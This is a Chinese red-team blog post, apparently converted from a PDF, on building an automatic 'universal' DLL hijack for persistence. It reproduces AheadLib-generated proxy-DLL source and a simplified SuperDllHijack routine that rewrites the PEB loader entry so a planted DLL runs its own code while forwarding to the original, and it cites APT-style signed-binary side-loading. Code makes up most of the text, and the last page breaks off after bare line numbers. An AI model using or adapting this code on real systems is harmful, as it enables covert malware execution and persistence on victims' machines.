⾃动化通⽤DLL劫持 - 1
⾃动化通⽤DLL劫持
之前写过⼀篇
使⽤⽩加⿊的⽅式⽣成"冲锋⻢"，使⽤到部分 dll 劫持的技术。但是它的场景是劫持后阻断正常⽩⽂件的运⾏，程序的控制权交到“⿊⽂
件”中。
这篇⽂章是对通⽤ DLL 劫持的研究，期望能制作⼀个通⽤的 DLL，劫持程序原有的 dll 但保留原 dll 的功能，同时执⾏⾃⼰的代码，这个 dll
最好能⾃动⽣成(不要⼿动编译)，主要⽤于维权场景。
已有研究
Aheadlib
著名的⼯具 Aheadlib 能直接⽣成转发形式的 dll 劫持源码,通过 #pragma comment(linker,"/EXPORT:") 来指定导出表的转发。
转发模式⽣成的源码：
红队开发 - ⽩加⿊⾃动化⽣成器.md - ⼩草窝博客
参考⼀些APT组织的攻击⼿法，它们在投递⽊⻢阶段有时候会使⽤“⽩加⿊”的⽅式，通常它们会使⽤⼀个带有签名的⽩⽂件+⼀个⾃定义dll⽂件，所以
研究了⼀下这种⽩加⿊的实现⽅式以及如何将...
x.hacking8.com
⾃动化通⽤DLL劫持 - 2
C++
及时调⽤模式⽣成的源码：
每个导出函数会跳转到⼀个全局保存的地址中，在 dll 初始化的时候会通过解析原 dll 对这些地址依次赋值。
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件 
#include  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数 
#pragma comment(linker, "/EXPORT:Box=testOrg.Box,@1") 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数 
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) 
{ 
  if (dwReason == DLL_PROCESS_ATTACH) 
  { 
    DisableThreadLibraryCalls(hModule); 
  } 
  else if (dwReason == DLL_PROCESS_DETACH) 
  { 
  } 
  return TRUE; 
} 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
⾃动化通⽤DLL劫持 - 3
C++
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件 
#include  
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数 
#pragma comment(linker, "/EXPORT:Box=_AheadLib_Box,@1") 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 原函数地址指针 
PVOID pfnBox; 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 宏定义 
#define EXTERNC extern "C" 
#define NAKED __declspec(naked) 
#define EXPORT __declspec(dllexport) 
#define ALCPP EXPORT NAKED 
#define ALSTD EXTERNC EXPORT NAKED void __stdcall 
#define ALCFAST EXTERNC EXPORT NAKED void __fastcall 
#define ALCDECL EXTERNC NAKED void __cdecl 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// AheadLib 命名空间 
namespace AheadLib 
{ 
  HMODULE m_hModule = NULL;  // 原始模块句柄 
  DWORD m_dwReturn[1] = {0};  // 原始函数返回地址 
  // 获取原始函数地址 
  FARPROC WINAPI GetAddress(PCSTR pszProcName) 
  { 
    FARPROC fpAddress; 
    CHAR szProcName[16]; 
    TCHAR tzTemp[MAX_PATH]; 
    fpAddress = GetProcAddress(m_hModule, pszProcName); 
    if (fpAddress == NULL) 
    { 
      if (HIWORD(pszProcName) == 0) 
      { 
        wsprintfA(szProcName, "%d", pszProcName); 
        pszProcName = szProcName; 
⾃动化通⽤DLL劫持 - 4
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
      } 
      wsprintf(tzTemp, TEXT("无法找到函数 %hs，程序无法正常运行。"), pszProcName); 
      MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP); 
      ExitProcess(-2); 
    } 
    return fpAddress; 
  } 
  // 初始化原始函数地址指针 
  inline VOID WINAPI InitializeAddresses() 
  { 
    pfnBox = GetAddress("Box"); 
  } 
  // 加载原始模块 
  inline BOOL WINAPI Load() 
  { 
    TCHAR tzPath[MAX_PATH]; 
    TCHAR tzTemp[MAX_PATH * 2]; 
    lstrcpy(tzPath, TEXT("testOrg.dll")); 
    m_hModule = LoadLibrary(tzPath); 
    if (m_hModule == NULL) 
    { 
      wsprintf(tzTemp, TEXT("无法加载 %s，程序无法正常运行。"), tzPath); 
      MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP); 
    } 
    else 
    { 
      InitializeAddresses(); 
    } 
    return (m_hModule != NULL);   
  } 
  // 释放原始模块 
  inline VOID WINAPI Free() 
  { 
    if (m_hModule) 
    { 
      FreeLibrary(m_hModule); 
    } 
  } 
} 
using namespace AheadLib; 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数 
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) 
{ 
  if (dwReason == DLL_PROCESS_ATTACH) 
  { 
    DisableThreadLibraryCalls(hModule); 
    return Load(); 
  } 
  else if (dwReason == DLL_PROCESS_DETACH) 
  { 
    Free(); 
  } 
⾃动化通⽤DLL劫持 - 5
缺点也有，它在导出函数中使⽤汇编语法直接 jump 到⼀个地址，但在 x64 模式下⽆法使⽤，这种写法感觉也不太优雅。
不过 Aheadlib ⽣成的源码，编译出来⽐较通⽤，适合 输入表dll加载 以及 Loadlibrary 加载劫持的形式。
易语⾔ DLL 劫持⽣成
这个⼯具⽣成的源码看起来⽐ Aheadlib 简洁⼀点，它会 LoadLibrary 原始 dll，通过 GetProcAddress 获取原始 dll 的函数地址和本身
dll 的函数地址，直接在函数内存地址写⼊ jmp 到原始 dll 函数的机器码。
这种⽅式⽐上⾯的代码简洁，⽤ C 改写下，⽀持 x64 的话计算⼀下相对偏移应该也 ok。但还是⽐较依赖于⾃动⽣成源码，再进⾏编译。
⼀种通⽤ DLL 劫持技术研究
来⾃：
作者 @anhkgg 通过分析 LoadLibraryW 的调⽤堆栈以及相关源码得出结论
测试代码也很简单
136
137
  return TRUE; 
} 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数 
ALCDECL AheadLib_Box(void) 
{ 
  __asm JMP pfnBox; 
} 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
https://www.52pojie.cn/forum.php?mod=viewthread&tid=830796
直接获取 peb->ldr 遍历链表找到⽬标 dll 堆栈的 LdrEntry 就是需要修改的 LdrEntry，然后修改即可作为通⽤ DLL 劫持。
⾃动化通⽤DLL劫持 - 6
C++
Github 地址: 
我将这个代码精简优化了下，也⽀持了 x64
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
void* NtCurrentPeb() 
{ 
    __asm { 
        mov eax, fs:[0x30]; 
    } 
} 
PEB_LDR_DATA* NtGetPebLdr(void* peb) 
{ 
    __asm { 
        mov eax, peb; 
        mov eax, [eax + 0xc]; 
    } 
} 
VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod) 
{ 
    WCHAR wszDllName[100] = { 0 }; 
    void* peb = NtCurrentPeb(); 
    PEB_LDR_DATA* ldr = NtGetPebLdr(peb); 
    for (LIST_ENTRY* entry = ldr->InLoadOrderModuleList.Blink; 
        entry != (LIST_ENTRY*)(&ldr->InLoadOrderModuleList); 
        entry = entry->Blink) { 
        PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry; 
        memset(wszDllName, 0, 100 * 2); 
        memcpy(wszDllName, data->BaseDllName.Buffer, data->BaseDllName.Length); 
        if (!_wcsicmp(wszDllName, dllname)) { 
            data->DllBase = hMod; 
            break; 
        } 
    } 
} 
VOID DllHijack(HMODULE hMod) 
{ 
    TCHAR tszDllPath[MAX_PATH] = { 0 }; 
    GetModuleFileName(hMod, tszDllPath, MAX_PATH); 
    PathRemoveFileSpec(tszDllPath); 
    PathAppend(tszDllPath, TEXT("mydll.dll.1")); 
    HMODULE hMod1 = LoadLibrary(tszDllPath); 
    SuperDllHijack(L"mydll.dll", hMod1); 
} 
BOOL APIENTRY DllMain( HMODULE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved 
                     ) 
{ 
    switch (ul_reason_for_call) 
    { 
    case DLL_PROCESS_ATTACH: 
        DllHijack(hModule); 
        break; 
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH: 
        break; 
    } 
    return TRUE; 
} 
https://github.com/anhkgg/SuperDllHijack
⾃动化通⽤DLL劫持 - 7
C++
缺点是这种⽅式只适⽤于 LoadLibrary 动态加载的⽅式。
在 issue 中有⼈对隐藏性作了讨论 
思路不错，也放上来展示⼀下。
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33